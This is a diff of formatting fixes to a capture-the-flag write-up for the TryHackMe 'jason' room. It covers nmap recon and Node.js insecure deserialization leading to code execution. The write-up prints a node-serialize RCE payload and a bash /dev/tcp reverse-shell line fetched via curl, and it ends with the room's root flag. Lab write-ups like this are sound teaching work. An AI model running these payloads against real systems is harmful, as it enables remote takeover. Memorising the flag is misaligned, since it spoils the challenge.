@@ -16,7 +16,7 @@ tags: "tryhackme writeup"
 **Room Link:** [jason](https://tryhackme.com/room/jason)
 
 # RECON :
-As always i start enumaratin the box with nmap to see the open ports , including the version of the services 
+As always i start enumarating the box with nmap to see the open ports , including the version of the services 
 
 ````
 nmap -sCV -vv 10.129.145.140 -oN scan.nmap --reason 
@@ -83,7 +83,7 @@ i found an interesting article explaining how the node.js is vulnerable to insec
 
 **Link:** [jason](https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution)
 
-the payload : 
+**the payload :**
 ````
 {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
 ````
@@ -96,7 +96,7 @@ ping my machine to see if we can excute code on the box :
 
 ![Image]({{ site.baseurl }}/images/jason/7.png)
 
-** base64 encode the payload **
+**base64 encode the payload**
 
 ![Image]({{ site.baseurl }}/images/jason/8.png)
 
@@ -108,7 +108,7 @@ ping my machine to see if we can excute code on the box :
 
 there a tousend way to get a shell rn , to make my life easier i'll : 
 
-- curl a s.sh on my machine with a revshell in it  : ``` bash -i &>/dev/tcp/ip/port <&1 ````
+- curl a s.sh on my machine with a revshell in it  : ```bash -i &>/dev/tcp/ip/port <&1```
 
 payload :
 ````
@@ -123,6 +123,7 @@ payload :
 we in !
 
 i dont know why (yet) , i got root access just by gotting a shell , LOL 
+
 ![Image]({{ site.baseurl }}/images/meme/idk.png)
 
 ![Image]({{ site.baseurl }}/images/jason/11.png)
@@ -130,7 +131,7 @@ i dont know why (yet) , i got root access just by gotting a shell , LOL
 # ROOT FLAG :
 ![Image]({{ site.baseurl }}/images/jason/12.png)
 
-** FLAG : **
+**FLAG :**
 ```
 2cd5a9fd3a0024bfa98d01d69241760e
 ```
